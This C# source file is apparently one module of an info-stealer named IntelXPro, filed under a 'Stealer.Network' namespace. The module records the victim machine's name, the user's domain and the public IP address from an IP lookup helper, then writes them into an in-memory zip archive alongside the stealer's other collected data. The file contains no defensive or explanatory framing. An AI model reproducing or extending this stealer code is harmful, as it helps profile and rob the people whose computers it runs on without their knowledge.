using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.Text;

namespace IntelXPro.src.IntelXPro.Stealer.Network
{
    internal class BasicInfo : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var networkApp = new Counter.CounterApplications { Name = "Basic Network Info" };
                StringBuilder sb = new StringBuilder();
                
                sb.AppendLine("[Basic Network Info]");
                sb.AppendLine($"Collected at: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                sb.AppendLine();
                sb.AppendLine($"Computer Name: {Environment.MachineName}");
                sb.AppendLine($"User Domain: {Environment.UserDomainName}");
                
                string publicIp = IpApi.GetPublicIp();
                sb.AppendLine($"Public IP: {publicIp}");
                
                string targetPath = "Network\\basic_info.txt";
                zip.AddTextFile(targetPath, sb.ToString());
                networkApp.Files.Add(targetPath);
                
                if (networkApp.Files.Count > 0)
                {
                    counter.Applications.Add(networkApp);
                }
            }
            catch (Exception ex)
            {
                var networkApp = new Counter.CounterApplications { Name = "Basic Network Info" };
                StringBuilder errorSb = new StringBuilder();
                errorSb.AppendLine("[Basic Network Info]");
                errorSb.AppendLine($"Error collecting basic network info: {ex.Message}");
                
                string targetPath = "Network\\basic_info.txt";
                zip.AddTextFile(targetPath, errorSb.ToString());
                networkApp.Files.Add(targetPath);
                counter.Applications.Add(networkApp);
            }
        }
    }
}
